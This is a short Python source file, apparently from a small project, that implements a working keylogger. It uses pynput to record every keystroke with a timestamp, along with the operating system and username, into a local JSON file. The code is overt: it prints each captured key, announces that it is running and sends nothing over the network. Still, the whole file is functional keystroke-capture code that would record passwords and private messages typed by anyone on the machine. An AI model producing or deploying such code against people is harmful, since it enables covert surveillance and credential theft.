from pynput import keyboard
import json
import os
from datetime import datetime
import platform
import getpass

class KeyLogger:
    def __init__(self, output_path=None):
        base_dir = os.path.dirname(os.path.abspath(__file__))  # This file's dir (e.g., src/keylogger/)
        if output_path is None:
            output_path = os.path.join(base_dir, "../../keylogs.json")  # 2 levels up = project root
        self.output_path = os.path.abspath(output_path)

        self.session_data = {
            "start_time": str(datetime.now()),
            "system_info": {
                "platform": platform.system(),
                "platform_version": platform.version(),
                "user": getpass.getuser()
            },
            "keystrokes": []
        }

    def _ensure_file(self):
        os.makedirs(os.path.dirname(self.output_path), exist_ok=True) if os.path.dirname(self.output_path) else None
        if not os.path.exists(self.output_path):
            with open(self.output_path, "w", encoding="utf-8") as f:
                json.dump(self.session_data, f, indent=4)

    def _save_json(self):
        with open(self.output_path, "w", encoding="utf-8") as file:
            json.dump(self.session_data, file, indent=4)

    def on_press(self, key):
        try:
            key_name = key.char
        except AttributeError:
            key_name = str(key)

        if key_name == "Key.space":
            key_name = " "
        elif key_name == "Key.enter":
            key_name = "[ENTER]"
        elif key_name == "Key.backspace":
            key_name = "[BACKSPACE]"
        elif "Key." in key_name:
            key_name = f"[{key_name.replace('Key.', '').upper()}]"

        print(f"[Key Pressed] {key_name}")
        self.session_data["keystrokes"].append({
            "key": key_name,
            "timestamp": str(datetime.now())
        })

        self._save_json()

    def run(self):
        print("Starting keylogger... Press Ctrl+C to stop.")
        self._ensure_file()
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# For testing only
if __name__ == "__main__":
    logger = KeyLogger()
    logger.run()
